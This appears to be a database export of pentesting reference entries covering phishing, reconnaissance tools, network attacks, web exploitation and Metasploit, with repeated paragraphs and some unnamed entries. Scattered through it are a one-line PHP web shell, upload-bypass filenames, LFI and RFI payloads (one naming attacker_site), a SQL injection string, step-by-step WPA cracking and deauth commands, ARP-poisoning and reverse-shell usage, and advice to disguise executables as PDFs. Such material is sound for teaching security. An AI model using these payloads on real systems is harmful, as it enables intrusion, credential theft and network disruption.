Topics.Name: Phishing
Topics.Description:
Phishing is the criminally fraudulent process of attempting to acquire sensitive information such
as usernames, passwords, and credit card details by masquerading as
a trustworthy entity in an electronic communication.For more info, check out gophish.
Topics.Description_HTML: Phishing is the criminally fraudulent process of attempting to acquire sensitive information such as usernames, passwords, and credit card details by masquerading as a trustworthy entity in an electronic communication.For more info, check out gophish.

Topics.Name: Elicitation
Topics.Description:
Elicitation is the process of extracting information from something or someone.
Elicitation can be used to know people better, making a social engineering attack more effective.

Elicitation is the process of extracting information from something or someone.

Topics.Name: Pretexting
Topics.Description:
Pretexting is a social engineering technique wherein a hacker uses false pretenses to engage with his/her
intended victim in order to get information from that target.
Topics.Description_HTML: Pretexting is a social engineering technique wherein a hacker uses false pretenses to engage with his/her intended victim in order to get information from that target.

Topics.Name: Character Creation
Topics.Description:
Character Creation is important to make the story convincing and consistent. 
The complexity of the character is determined by how much planning and depth is required.

Topics.Name: Gophish
Topics.Description:
Gophish is an open-source framework that makes testing an organizations exposure to phishing easily and effectively.
This tool allows you to set your targets, choose a template, and track the results in real time.
More can be found at https://getgophish.com

More can be found at https://getgophish.com

Topics.Name: Social Engineering Toolkit
Topics.Description:
Social Engineering Toolkit is an open-source pentesting framework designed to launch social engineering campaigns.
This tool has lots of custom attack vectors that make convincing phishing scenarios.
Some attacks are:
 Spear-Phishing
Java Applet Attack
Metasploit Browser Exploit
Credential Harvester
Tabnabbing Attack
Web Jacking Attack
Wireless-Attacks
To launch SET, type ./set
More info at: https://www.social-engineer.org/framework/se-tools/computer-based/social-engineer-toolkit-set/

Topics.Name: Resource Hacker
Topics.Description:
Resource Hacker is a tool that is used to edit components of any file.
 This is useful in social engineering attacks because you can make en exe look like a pdf by changing the file's image.

Topics.Name: Excel Macros
Topics.Description:
Macros can be made within Excel to execute programs, or execute Powershell commands.
This can be powerful in Phishing attacks where you can get users to open your malicious file.

Topics.Name: theHarvester
Topics.Description:
theHarvester is a tool for gathering e-mail accounts, subdomain names, virtual
hosts, open ports/banners, and employee names from different public sources
(search engines, pgp key servers).
This tool is helpful to gather information at the start of a PenTest (or hack)
https://github.com/laramies/theHarvester

This tool is helpful to gather information at the start of a PenTest (or hack) https://github.com/laramies/theHarvester

Topics.Name: Sublist3r
Topics.Description:
Sublist3r is similar to theHarvester, and is designed to enumerated subdomains of websites.
It enumerates the subdomains using search engines such as Google, Yahoo, Bing, Baidu, and Ask.
It also utilizes Netcraft, Virustotal, ThreatCrowd, DNSdumpster, and Reverse DNS
https://github.com/aboul3la/Sublist3r

Topics.Name: GHDB
Topics.Description:
Google Hacking Database utilizes Google's detailed search engine options to find very valuable information about a company,
and can determine major vulnerabilities depending on the information that is found. GHDB can find anything from vulnerabilities, error messages
plaintext passwords, usernames, login portals, sensitive documents, and much more!
It's important to note that it is not illegal to use DHDB, but it can be if you decide to click on something as a result of a search that displays
sensitive information.
http://www.hackersforcharity.org/ghdb/

Topics.Name: Shodan
Topics.Description:
Shodan is a large search engine for any device that is reachable on the Internet. Shodan can be thought of as a portscan for the entire Internet!
It examines and documents the responses of the devices which can:
-determine the target OS, or Web server software version
-checks if the default username and password is being used
-identify webcams, firewalls, network printers, and VoIP devices
Registration is required, and all activity is logged. Be careful as to what you click on resulting from a Shodan search; it can be traced to you!
http://shodan.io

Topics.Name: DNS Discovery
Topics.Description:
Performed through looking up WHOIS records for the Authoritative nameservers
Subdomains of the main domain name should be checked and referenced with other domains under the target domain
Sublist3r is a recommended tool however is considered active recon as it's very noisy trying random subdomains.
DNS Types are as follows:

-A: Host's IP address
-MX: Host/domain's mail exchanger(s)
-NS: Host or domain's name server(s)
-CNAME: Host's canonical name allowing additional names or aliases
-SOA: Authority for the domain
-SRV: Service location record often used with Session Initiation Protocol (SIP) and the Extensible Messaging Presence Protocol (XMPP)
-RP: Responsible person
-PTR: Pointer to a canonical name, used for reverse lookups.

Topics.Name: Zone Transfering
Topics.Description:
Known as AXFR DNS zone transfers, are a type of DNS transaction. It's function is designed to replicate the databases containing DNS information across many DNS servers.
 Zone Transfering has two types:
-AXFR: The mechanism for transfering information from a primary nameserver to a secondary DNS server.
IXFR: The incrementation of a zones serial number for version control of the DNS databases, this allows for just the updates needed to be transferred to the lower DNS servers when versions are out of date.
Common tools used in Zone Transfering are:
-host
-dig
-nmap

Topics.Name: Dig
Topics.Description:
Dig is a DNS lookup utility which stands for 'Domain Information Groper'
The dig command has the following parameters:
dig [@server] [-b address] [-c class] [-f filename] [-k filename] [-m] [-p port#] [-q name] [-t type] [-x addr] [-y [hmac:]name:key] [-4] [-6] [name] [type] [class] [queryopt...]
 Typical dig commands look like: dig @server name type so for example
Digging google.com: dig @8.8.8.8 google.com
Digging google.com MX records: dig @8.8.8.8 google.com MX
 Dig Reverse DNS Lookup: dig -x 216.58.220.110

More information: https://linux.die.net/man/1/dig

Topics.Name: Host
Topics.Description:
Host is a DNS lookup utility typically used to convert names to IP addresses.
 The host command has the following parameters:
host [-aCdlnrsTwv] [-c class] [-N ndots] [-R number] [-t type] [-W wait] [-m flag] [-4] [-6] {name} [server]
Typical host commands look like the following: host google.com
host 173.194.78.101
Display MX records for a domain: host -n -t mx google.com
Find domain name servers: host -t ns google.com

More information: https://linux.die.net/man/1/host

Topics.Name: Fierce
Topics.Description:
Fierce is a tool to be used to specifically locate likely targets inside and outside a corporate network. Fierce is a reconnaissance tool which quickly scans domains.
The fierce command has the following parameters: 
fierce [-connect] [-delay] [-dns] [-dnsfile] [-file] [-fulloutput] [-nopattern] [-range] [-search] [-traverse] [-wide] [-wordlist]
A typical fierce scan would look like the following: fierce -dns google.com

More information: https://tools.kali.org/information-gathering/fierce

Topics.Name: Dnsenum
Topics.Description:
Dnsenum is a tool used to enumerate DNS information to discover non-contiguous ip blocks.
 The dnsenum command has the following parameters:
dnsenum [--dnsserver] [--enum] [--subfile <file>] [-t <value>] [--threads <value>] [-verbose] [-pages] [-scrap <value>] [--file <file>] [-u] [-r] [-w] [-e] [-o]
A typical dnsenum command would look like the following:
dnsenum --enum -f -r google.com
dnsenum --noreverse -o mydomain.xml example.com
dnsenum -h

More Information: https://tools.kali.org/information-gathering/dnsenum

A typical dnsenum command would look like the following:

dnsenum --noreverse -o mydomain.xml example.com

dnsenum -h

More Information: https://tools.kali.org/information-gathering/dnsenum

Topics.Name: Dnsrecon
Topics.Description:
Dns recon is a tool used to do many things such as check all NS records for Zone transfers, Enumerate General DNS Records for for a given Domain (MX, SOA, NS, A, AAAA, SPF and TXT), perform SRV Record Enumeration, Brute Force subdomain and host A and AAAA records, and much more.
Dnsrecon has the following parameters:
dnsrecon [-h] [-d] [-r] [-n] [-D] [-f] [-t <type>]
A typical dnsrecon command looks like:
dnsrecon -d example.com -D /usr/share/wordlists/dnsmap.txt -t std --xml dnsrecon.xml
dnsrecon -d <google.com> -a
dnsrecon  -r <startIP>-<endIP>
dnsrecon  -d <domain> -s

More Informationo: https://tools.kali.org/information-gathering/dnsrecon
Topics.Description_HTML:
Dns recon is a tool used to do many things such as check all NS records for Zone transfers, Enumerate General DNS Records for for a given Domain (MX, SOA, NS, A, AAAA, SPF and TXT), perform SRV Record Enumeration, Brute Force subdomain and host A and AAAA records, and much more.

Dnsrecon has the following parameters:

dnsrecon [-h] [-d] [-r] [-n] [-D] [-f] [-t ]

A typical dnsrecon command looks like:

dnsrecon -d example.com -D /usr/share/wordlists/dnsmap.txt -t std --xml dnsrecon.xml dnsrecon -d -a

dnsrecon -r -

dnsrecon -d -s

More Informationo: https://tools.kali.org/information-gathering/dnsrecon

Topics.Name: Reverse DNS
Topics.Description:
Used to obtain valid server names currently in use within an organization. However the DNS server must have a PTR (reverse) DNS record for it to resolve a name from a provided IP address.
Reverse DNS uses a provided IP address to query a DNS server for the domain name associated with the provided IP address.

Reverse DNS uses a provided IP address to query a DNS server for the domain name associated with the provided IP address.

Topics.Name: Forward DNS
Topics.Description:
Known as 'DNS Bruteforcing' uses a domain name to map IP addresses, essentially the opposite of Reverse DNS. This allows the discovery of additional host names that are not commonly known within networks.
Available tools are:
-Fierce
-Dnsenum
-Dnsrecon
-Sublist3r

Topics.Name: SMTP
Topics.Description:
Simple Mail Transfer Protocol on TCP port 25, generally used to be sent to relay mail servers to while using somethign like IMAP or POP3 to receive messages (TCP Port 587 Typically).
 Known tools for SMTP:
-smtp-userenum
-smtpscan
-swaks *Swiss Army Knife for SMTP*
-smtp-enum-users

Topics.Name: SMTP Bounce Back
Topics.Description:
Known as a Non-Delivery Report/Receipt, failed Delivery Status Notification (DSN) message, Non-Delivery Notification (NDN), or a bounce is an automated messaged from a mail system informing the sender of a message about a delivery problem.
Can be generated by referencing bogus addresses within a target's domain.
Topics.Description_HTML:
Known as a Non-Delivery Report/Receipt, failed Delivery Status Notification (DSN) message, Non-Delivery Notification (NDN), or a bounce is an automated messaged from a mail system informing the sender of a message about a delivery problem.

Can be generated by referencing bogus addresses within a target's domain.

Topics.Name: SMTP Open Relay
Topics.Description:
An SMTP server that will deliver on behalf of any domain without requiring authentication. Abused by spammers to send mass amounts of spam through systems.
These servers are perfect for sending forged emails through which are less likely to be caught by spam filters with organization addresses.
 Useful relay scanning tool: -ORFinder

Topics.Name: smtp-user-enum
Topics.Description:
smtp-user-enum is a tool for enumerating OS-level user accounts via the SMTP service. Enumeration is performed by inspecting responses to VRFY, EXPN, and RCPT TO commands.
smtp-user-enum has the following parameters:
smtp-user-enum [-m] [-M] [-u] [-f] [-D] [-U] [-t <host>] [-T <file>] [-p <port>] [-d] [-t <n>]
A typical smtp-user-enum commands looks like:
smtp-user-enum -h
smtp-user-enum -M VRFY -u root -t 192.168.1.25

More Information: https://tools.kali.org/information-gathering/smtp-user-enum

A typical smtp-user-enum commands looks like:

More Information: https://tools.kali.org/information-gathering/smtp-user-enum

Topics.Name: smtpscan
Topics.Description:
Smtpscan is a remote SMTP server version detector, it can be used to make a logical guess on which SMTP version the target server is running using test commands.
Smtpscan has the following parameters:
 smtpscan [-h] [-V] [-v] [-d] [-f] [-t] [-p] [-i] [-c] [-D] [-n] [-a]
A typical Smtpscan command looks like:
smtpscan google.com
smtpscan smtp1.google.com smtp2.google.com
smtpscan -D google.com

More information: http://www.linuxcertif.com/man/1/smtpscan/

Topics.Name: swaks
Topics.Description:
swaks - Swiss Army Knife SMTP is a flexible transaction-oriented SMTP test tool. Swaks handles SMTP features and extensions like TLS, authentication, and pilplining. Supports multiple versions of the protocol including:
-SMTP
-ESMTP
-LMTP
swaks has the following parameters:
 swaks [--to] [--server] [--from] [--auth] [--auth-user] [--header] [--attach] [--body] [--socket]
A typical swaks command looks like:
swaks --to user@example.com --server test-server.example.net
swaks --to user@example.com --body /path/to/gtube/file

More information: http://www.jetmore.org/john/code/swaks/latest/doc/ref.txt

Topics.Name: Banner Grabbing
Topics.Description:
Enumeration technique used to glean information about computer systems on a network, and services running on open ports. We can use this to identify versions of applications, operating systems, and other things on a target host.
 Typicallyperformed over: HTTP, FTP, and SMTP
 Tools used:
-Telnet
-Nmap
-Curl
-Netcat

Typicallyperformed over: HTTP, FTP, and SMTP Tools used:

-Telnet

-Nmap

-Curl

-Netcat

Topics.Name: SNMP Sweeps
Topics.Description:
SNMP: Simple Network Management Protocol, gives a vast amount of information about specific system. SNMP is a stateless, diagram oriented protocol much like UDP. SNMPv1 authentication uses a secret, mutually known string known as the community string to authenticate the service:
-Done over plaintext
-Default community string is typically 'public' or 'community'
It's worth noting that newer versions do not use plaintext transport.
SNMP servers will not respond to requests with invalid community strings and the underlying UDP protocol does not reliably report closed UDP ports.
Therefore no response from a probed IP address can mean the following:
-Machine unreachable
-SNMP server not running
-Invalid Community String
-Response datagram has not arrived yet

We can poll the following information via SNMP:
-Computer name
-Logged in users
-Number of processes
-Owners of processes
-Patch levels (Uncommon)
-Resource usage

Topics.Name: Server Message Block
Topics.Description:
Windows clients connect to Windows servers using CIFS (common Internet filesystem protocol) & SMB (Server Message Block) protocols to share files, access printers, etc.
 CIFS supersedes SMB adding additional access control mechanisms, file, and disk management techniques.
Both run on TCP ports 139 and 445.
Four main SMB protocol versions exist which are the following:
-SMB 1.0
-SMB 2.0
-SMB 2.1
-SMB 3.0
NMAP is a great tool for SMB scanning as it can use it's network propagation functionality to mass scan networks for information and running services with open ports.
Helpful tools that can be used are:
 SMBTouch

Topics.Name: PowerSploit
Topics.Description:
Powersploit is a collection of PowerShell scripts used in post-exploitation scenarios. You can view these tools in Kali by default by entering:
ls -l /usr/share/powersploit/

More information: https://tools.kali.org/maintaining-access/powersploit
Topics.Description_HTML:
Powersploit is a collection of PowerShell scripts used in post-exploitation scenarios. You can view these tools in Kali by default by entering: ls -l /usr/share/powersploit/

More information: https://tools.kali.org/maintaining-access/powersploit

Topics.Name: Active Directory Recon
Topics.Description:
With direct access to a domain, tons of information can be gathered through AD.
Most recon through active directory is performed using PowerShell
Active Directory also supports standard LDAP queries over TCP 389 which require no special privileges, and if on a domain you will have full access.
Tools used in AD Recon:
-Powersploit
-windapsearch *LDAP-specific*

Topics.Name: Network Device Enumeration
Topics.Description:
Network Device Enumeration allows for host discovery on a target network, we can use this to enumerate live hosts and network hops on a LAN or WAN.
 Many hosts will often not reply to these queries because of firewall locality and OS firewalls.
 Techniques used for Network Scanning are:
-ICMP Scan
-ARP Scan
-Traceroute scan

Tools used for Network Enumeration are:
-Nmap
-Traceroute
-Netdiscover

Many hosts will often not reply to these queries because of firewall locality and OS firewalls.

Tools used for Network Enumeration are: -Nmap

-Traceroute

-Netdiscover

Topics.Name: Network Device Enumeration
Topics.Description:
Netdiscover is used for scanning hosts generally over Layer 2 but generally is an active/passive scanner for networks without a DHCP server.
Netdiscover has the following parameters:
netdiscover [-i device] [-r range | -p] [-s time] [-n node] [-c count] [-f] [-S]
A typical netdiscover command looks like the following:
netdiscover -I eth0 -r 192.168.100.0/24
More information: https://github.com/alexxy/netdiscover

Topics.Name: Nmap
Topics.Description:
Nmap is a utility used to scan networks and hosts for open ports,services and operating systems by sending packets to selected hosts.
Nmap will scan the selected IP address (both IPv4 and IPv6 are supported, and the range of ports specified (default TCP and UDP top 1000 ports).

In order to discover hosts:
Ping Only (-sP)
ARP Ping (-PR)
ICMP Echo Request Ping (-PE)
TCP SYN Ping (-PS)
TCP ACK Ping (-PA)
UDP Ping (-PU)
In order to discover open ports:
TCP SYN or Stealth Scan (-sS)
TCP Connect Scan (-sT)
TCP ACK Scan
 UDP Scan (-sU)
TCP FIN Scan (-sF)
TCP NULL Scan (-sN)
XMAS Scan Scan (-sX)
Custom Scan (--scanflags)
IP Protocol Scan (-sO)

Topics.Description:
Unicornscan is a network stack scanner that focuses mainly on unprivilaged scanning (no root requirement).
Unicornscan scans thousands of hosts and ports extremly fast as it operates in its own network stack.

It uses custom engines and scripts. It is perfect for auditing,PCI compliance tests and pen-testing.

Topics.Description:
Nexpose monitors network exposures and threats in real-time and alerts the network administrator the moment an impact occurs.
It scans the network using custom engines and scripts and reports the results using the CVE database.

Topics.Name: dnsdumpster
Topics.Description:
DNSdumpster is a free online tool which searches a main website's domain, and lists all the subdomains that fall under it.
It is useful for listing hidden subdomains that are not publicly known, which might be exploitable.
For more info:https://dnsdumpster.com/

Topics.Name: Empire
Topics.Description:
Empire is a post-exploiotation tool designed to run PowerShell agents, and deploying common post-exploitation
modules ranging from key loggers to Mimikatz.
Mimikatz is commonly used to extract sensitive information from memory, but in
conjunction with Empire, you can easily escalate privelages.
The current categories for Empire are:
-Code Execution
-Collection
-Credentials
-Exfiltration
-Lateral Movement
-Management
-Persistence
-Privesc
-Recon
-Situational Awareness
-Trollsploit
All of these modules make the Post-Exploitation phase easier by putting them in one tool.
The components of Empire are as follows:
Listener - A component that opens a socket for the target machine to call home to the device running empire
Agent - the exploited PC running the shell back to the device
Modules - the subtools being ran against the Agent and its network
For more information on installation and use of empire, please go to: https://powershellempire.com

Certificate and configuration
Browser SSL implementation

Topics.Name: bettercap
Topics.Description:
This is a powerful yet flexible tool to perform various Man-in-the-middle attacks againsta network.
It can be used to manipulate HTTP,TCP and HTTPS traffic. It can also use ARP to poison and make the attacker the default gateway.
This will let the attacker sniff packets.
Here is an example command: bettercap -I eth0 -S ARP -X --target [IP] --proxy -P POST

Topics.Name: ARP Poisoning
Topics.Description:
ARP poisoning is a man-in-the-middle attack. The atatcker sends ARP reply messages to a device, making it send packets to it.
The attacker can act as a different device such as:
DHCP server
DNS server
Web server.

Topics.Name: Rogue DHCP Server
Topics.Description:
A rogue DHCP server acts as a man in the middle, tricking the computer to use it as its DHCP server when sending a request.An attacker who is in between a client and another DHCP server can take over the connection and set the:
Gateway
DNS Server
Hostnames
NTP Server

Topics.Name: Rogue Access Point
Topics.Description:
A rogue access point will trick nearby devices into connecting to it, by acting as an access point. Attackers can set-up their own devices as an access point and get close to the victim.
By mimicking a real AP, the victims device will connect to it thinking it's a real AP.
This will cause all the victims traffic to go through it, effectively making the attacker a man-in-the-middle.

Topics.Name: DNS Hijacking
Topics.Description:
DNS Hijacking occurs when an attacker attempts to send corrupted DNS packets to a victim. The victim sends information to the attacker whenever queries are required.
This is effective when trying to hijack websites for phishing.
Topics.Description_HTML:
DNS Hijacking occurs when an attacker attempts to send corrupted DNS packets to a victim. The victim sends information to the attacker whenever queries are required.
This is effective when trying to hijack websites for phishing.Source

Topics.Name: SSL Stripping
Topics.Description:
SSL/HTTPS is a safeguard against ARP and DNS spoofing. SSL stripping is a method for attackers to sniff packets and alter the HTTPS request. By doing so, attackers can force packets to use HTTP, removing the SSL encryption.
Once this is done, information is no longer encrypted and the attacker can see data in plain text.

Topics.Name: Border Gateway Protocol
Topics.Description:
BGP is the foundation of internet traffic. An attacker can advertise non-existent networks. A BGP attack can block a whole country or re-routetraffic from large sections of the world.
There's been instances where sections of the world lost internet connection due to incorrect BGP advertisements.

There's been instances where sections of the world lost internet connection due to incorrect BGP advertisements.

Topics.Name: Wormhole Attack
Topics.Description:
A wormhole attack is when the attacker receives packets in one location, and then tunnels them to another location in the network. This causes packets to be re-introducedin the network.
 It acts a lot like re-play networks, however in a large network scale. This is efficient against ad-hoc networks.

Topics.Name: Blackhole Attack
Topics.Description: A node in a network advertises non existent paths, in order to hinder the path-finding process. This tactic can also be used to intercept all data packets sent to a specific node.
Topics.Description_HTML:
A node in a network advertises non existent paths, in order to hinder the path-finding process. This tactic can also be used to intercept all data packets sent to a specific node.

Source

Topics.Name: Byzantine Attack
Topics.Description:
This is a stealth network attack that focuses on a compromised intermediate not, or a set of nodes that work in collusion and carry out attacks.
These attacks include routing loops, creating non-optimal paths and dropping specific packets. Due to their complexity, Byyzantine attacks are hard to detect. The network might seem to be operating normal, however there could be Byzantine behavior. It can be detected due to abnormal routing.

Source

Topics.Name: Routing Table Overflow
Topics.Description:
Routers have a table which holds all the IP addresses and paths in order to appropriately send packets. An attacking node advertises non-existent nodes, causing an overflow in existing routers.
This prevents new entries from being entered, therefore halting network routing and learning.

Routers have a table which holds all the IP addresses and paths in order to appropriately send packets. An attacking node advertises non-existent nodes, causing an overflow in existing routers.

Topics.Name: Stale Packet Replication
Topics.Description: An adversary nodereplicates stale packets and floods the network. This consumes bandwidth and resources available to nearby routers while also causing abnormal routing processes.
Topics.Description_HTML: An adversary nodereplicates stale packets and floods the network. This consumes bandwidth and resources available to nearby routers while also causing abnormal routing processes.

Topics.Name: Route Cache Poisoning
Topics.Description: This attack is most efficient to an ad-hoc network. An attacker will poison the route cache to fill it with non existent routers, congesting the network.
Topics.Description_HTML: This attack is most efficient to an ad-hoc network. An attacker will poison the route cache to fill it with non existent routers, congesting the network.

Topics.Name: SYN Flooding
Topics.Description: An attacker sends a large number of SYN packets to a victim, spoofing the return address. Creates half-open connections, which creates an overflow of TCP connections. This denies any legitimate clients from connecting.
Topics.Description_HTML: An attacker sends a large number of SYN packets to a victim, spoofing the return address. Creates half-open connections, which creates an overflow of TCP connections. This denies any legitimate clients from connecting.

Topics.Name: DNS Flooding
Topics.Description: This attack attempts fill up memory and CPU usage by flooding DNS UDP requests. This will block the DNS server from running since a surplus of requests are being spammed at the victim.
Topics.Description_HTML: This attack attempts fill up memory and CPU usage by flooding DNS UDP requests. This will block the DNS server from running since a surplus of requests are being spammed at the victim.

Topics.Name: DNS Amplification
Topics.Description:
The attacker turns initially small queries into large DNS payloads as an attempt to take down the victim's server.
DNS amplification manipulates publicly available systems making them send queries at the target.
This amplifies the attack as it creates a distributed denial of service using DNS queries.

Topics.Name: HTTP Flood
Topics.Description:
This is a distributed denial of service attack where legitimate HTTP GET or POST requests are sent to attack a web server/application. The attacker usually uses a bitnet (zombie army) which consists of connected nodes that have been taken over for the attack.
The owners of these zombies don't know their computers are being used for the attack.

Topics.Name: NTP Amplification Attack
Topics.Description: This is a type of distributed denial of service attack in which the attacker exploits NTP servers and sends UDP traffic in an attempt to take them down.
Topics.Description_HTML: This is a type of distributed denial of service attack in which the attacker exploits NTP servers and sends UDP traffic in an attempt to take them down.

Topics.Name: Wireless Jamming
Topics.Description:
The attacker finds the frequency of the receiving node. The attacker then transmits signal on that frequency attempting to jam the reception.
The attacker can also send de-auth packets directly to the victim AP.

The attacker finds the frequency of the receiving node. The attacker then transmits signal on that frequency attempting to jam the reception.

Topics.Name: Status Codes
Topics.Description:
HTTP server response codes are as follows:
-200: OK
-302: Location
-401: Unauthorized
-403: Forbidden
-404: Not Found
-500: Internal Server Error
Topics.Description_HTML:
HTTP server response codes are as follows: -200: OK

-302: Location

-401: Unauthorized -403: Forbidden

-404: Not Found

-500: Internal Server Error

Source

Topics.Name: HTTP States and Cookies
Topics.Description:
By design HTTP is stateless, therefore it cannot track data between requests in order to achieve this Web Developers implement state tracking mechanisms typically referred to as Session Identifiers.
Session ID's are passed during HTTP requests to associate the request with a session. These requests are implemented through the following means:
-URL
-Hidden form fields (POST)
-Cookie HTTP Header
Cookies are the most common place to find Session ID's in a response with a 'Set-Cookie' header, this can contain the following:
-Domain
-Path
-Expires
-Secure
-HttpOnly

Topics.Name: HTTP Session Hijacking
Topics.Description:
HTTP Session Hijacking is a method used to steal a legitimate users session during transit. HTTPS must be forced down to HTTP as otherwise the attacker will be unable to view the communication between client and server.
Upon the target visiting a login page the attacker can sniff the session cookie being sent to the target after a successful login authentication, alternatively this would be an excellent time to capture usernames and passwords if in plaintext.

Topics.Name: HTTP Strict Transport Security
Topics.Description:
HTTP Headers are often combined with certificate pinning which will force the browser to remember a TLS certificate and therefore force the browser to only communicate over HTTPS.
If HTTPS is constantly on the attacker must break SSL.

Topics.Name: SQL Injection
Topics.Description:
SQL Injection is an extremely common web exploitation as companies fail to treat data sent to their applications with scrutiny. This allows for attackers to play around and use a companies servers against them through commonly form input data disguised as a legitimate user request or POST.
SQL Injection can result in the loss of data, corruption, lack of accountability, and denial of access.
There are 3 types of SQL injection types:
1. In-band ('Error-based') used for finding and exploiting
2. Out-of-band ('Union-Based') used for extraction of data
3. Inferential ('Blind') noisy and time-consuming

SQL queries through web apps can look like the following:
SELECT id, name FROM users
WHERE name ='username'
AND password = 'password' ;
 NOTE: Proper implementations will used hashed passwords and may cause complications when SQL injecting in the password fields.

 In order to inject these queries we can add things like a tick operator (') and include any SQL code we want to execute after for successful matching of usernames we would do the following:
 username = name' OR '1'=1
 This query if not protected would resolve as true every single time.

Topics.Name: SQLMap
Topics.Description:
SQLMap is a tool used to automate the process of detecting SQL injection vulnerabilities. Including a detection engine and database fingerprinting from data fetching from the database, along with accessing the underlying file system and executing OS commands via out-of-band connections.
SQLmap takes the following parameters: SQLMap [-h] [--h] [-u] [-g] [--data] [--cookie] [--random-agent] [--proxy] [-tor] [-check-tor] [-a] [-b] [--passwords] plus many more.
A typical SQLMap command looks like the following:
sqlmap -u 'http://www.site.com/section.php?id=51'
sqlmap -u 'http://www.site.com/section.php?id=51' --dbs
sqlmap -u 'http://www.site.com/section.php?id=51' --columns -D safecosmetics -T users
More information: https://tools.kali.org/vulnerability-analysis/sqlmap

SQLMap is a tool used to automate the process of detecting SQL injection vulnerabilities. Including a detection engine and database fingerprinting from data fetching from the database, along with accessing the underlying file system and executing OS commands via out-of-band connections.

Topics.Name: Cross Site Scripting
Topics.Description:
Cross Site Scripting are attacks targeted at the users browsers interpreters, the vectors for this attack are limitless as it exploits stored data anywhere.
XSS flaws are found fairly easily through analyzingthe code, however the impact it can have on users and infrastructure if fairly significant.
From hijacking web pages to injecting XSS into databases for users to view in comment sections on threads injecting Javascript or using page code interpreters is a great way to XSS.

Topics.Name: Stored XSS
Topics.Description: Stored XSS is used to inject XSS scripts into some infrastructure medium like a database for example. Upon the XSS script being stored in the database when a regular user requests the page that the XSS script is stored on the code will be executed.
Topics.Description_HTML: Stored XSS is used to inject XSS scripts into some infrastructure medium like a database for example. Upon the XSS script being stored in the database when a regular user requests the page that the XSS script is stored on the code will be executed.

Topics.Name: Reflected XSS
Topics.Description: Reflected XSS uses one malicious page with XSS code on it to access a completely different website however accessing on the behalf of the victim and now the victim thinks the XSS script is from the target website and now the attacker can do whatever they want to the victims account.
Topics.Description_HTML: Reflected XSS uses one malicious page with XSS code on it to access a completely different website however accessing on the behalf of the victim and now the victim thinks the XSS script is from the target website and now the attacker can do whatever they want to the victims account.

Topics.Name: Web Shells
Topics.Description:
Uploading malicious files to web servers that contain shells, such as a PHP script. For example, this can be done where a user profile picture is uploaded, then delivered and executed to the user to show the profile picture. We can then upload webshells to the server allowing us as much access if not more than the application running the operations themselves.
A simple PHP file such as: <?php system($_GET['cmd']); ?>
Would allow us to execute CMD commands by appending ?cmd=command to the URL of the page vulnerable.

Topics.Name: Bypass Upload Restrictions
Topics.Description:
Bypassing upload restrictions can be done in many ways. Here are a few techniques:
Dual Extensions: shell.jpg.php
Null byte attack: shell.php%00.jpg
Inserting malicious code into the metadata
Creating a file with the correct JPG header and unrenderable content that includes PHP code
Use legacy extensions like php3

Topics.Name: File Inclusion Vulnerabilities
Topics.Description:
File Inclusion Vulnerabilities allow for attackers to include files into a web page, this is done by targeting 'dynamic file inclusion' mechanisms implemented in targeted applications.
This vulnerability occurs when user-supplied input is provided without proper validation.
This can lead to:
-Code execution on the web server
-Code execution on the client-side such as Javascript which can lead to other attacks such as XSS
-Denial of Service
-Sensitive Information Disclosure.
Topics.Description_HTML:
File Inclusion Vulnerabilities allow for attackers to include files into a web page, this is done by targeting 'dynamic file inclusion' mechanisms implemented in targeted applications.

This vulnerability occurs when user-supplied input is provided without proper validation.

This can lead to:

-Code execution on the web server

-Code execution on the client-side such as Javascript which can lead to other attacks such as XSS -Denial of Service

-Sensitive Information Disclosure.

Topics.Name: Local File Inclusion
Topics.Description:
LFI is the process of including files that are already locally present on a server, we exploit the vulnerable inclusion procedure implementation by the web application.
 When a page receives as input the path to the file that has to be included and this input is not properly sanitized, allowingdirectory traversal characters (like dot-dot-slash) to be injected.
Generally assumed to be just a PHP exploit it can be common in JSP, and ASP.

An example would be as follows: http://vulnerable_host/preview.php?file=example.html 
We would replace example.html will our own traversal characters such as: file=../../../../etc/passwd

Topics.Name: Remote File Inclusion
Topics.Description:
Remote File Inclusion much like Local File Inclusion works off the same premise the file is just referenced externally through URL.
 Take the following example: http://vulnerable_host/vuln_page.php?file=http://attacker_site/malicious_page 
 We can modify the file= to point to any file or page we want on the internet which in theory would be included in the PHP page upon request.

Topics.Name: WPA Crack
Topics.Description:
In order to crack WPA, we used aircrack-ng.

First the service is started on the WiFi card:
*airmon-ng start (interface)---Starts the monitoring service on wlan0*

Secondly we started to dump data that the laptop used:
*airdump-ng (interface)mon*---Shows the user info about current WiFi connections nearby

After, choose the selected BSSID you want to monitor in specific (the BSSID the victim is connected to):
*airodump-ng -c (channel) --bssid (BSSID) -w (path) (interface)*---This show you activity for the specified BSSID

In order to deauth, we used the following command and MAC of the specified victim (seen from the command above):
*aireplay-ng -0 2 -a (BSSID) -c (MAC) (interface)*---This will deAuth the specified MAC from the device and save the WPA handshake.

Next, we can aircrack it using this command:
*aircrack-ng -a2 -b (BSSID) -2 (PATH-OF-WORDLIST) (PATH-OF-CAP-FILE)*---This will give you the password of the WPA connection.

Topics.Name: MFconsole
Topics.Description:
MFconsole is the most popular command line and the most flexible. It is also the only interface that supports plugins.

Help commands:
help vulns
help connect
help route
help use

You can pick an exploit by:
use EXPLOIT
 use windows/shell_reverse_tcp

After, MFSconsole sets the following
set LHOST IP
set LPORT PORT

Once an exploit is found, it can be checked with:
check

 And then exploited with
exploit

Topics.Name: Metasploit database
Topics.Description:
The metasploit database keeps track of everything you have done to a network. This is essential for documenting a pentest. The databse must be configured.
A default workspace is always created.

hosts    lists available hosts in the database
services    ports/services gathered from known hosts
vuln -i    shows log of utilized vulns
db_import PATH    imports 3rd party tool
db_export PATH

Topics.Name: MSFvenom
Topics.Description:
Utility used to generate custom shellcode. It supports multiple architectures and commands. After you choose the payload, you use msfvenom to create the custom payload and try to get it on the victims computer without being detected.
Example command:
msfvenom -p linux/x86/exec CMD='/bin/sh' -a x86 -b 'SHELL' -i 0
-p     specifies payload
-a     specifies the architecture
-b      specifies bad characted to TRY and avoid.
-i     specifies number of times to encode.

Topics.Name: Client-Side Exploitation
Topics.Description:
Client-Side exploitation is becomming the new low hanging fruit with organizatitons hardening their endpoints attackers need a new point on entry into an organization.
Clients are the most susceptible to attack more than ever because all it takes is one user to create a backdoor into an organization. Clients are excellent targets because they have:
-Access to the internal network
-Possibly have local admin or power user groups
-Gullible in comparisson to other avenues of social engineering

Topics.Name: Desktop Exploitation
Topics.Description:
Desktops are generally lower down on the list of expected attack vectors, therefore generally experience less protection and general attention from an organization. However, because desktops have no need to be remotely accessed it makes it hard to fingerprint them without some form of direct access.
Desktops present many more ways to attack due to many 3rd party applications, and in-house software. This gives us as attackers many different ways to exploit the workstation machine.
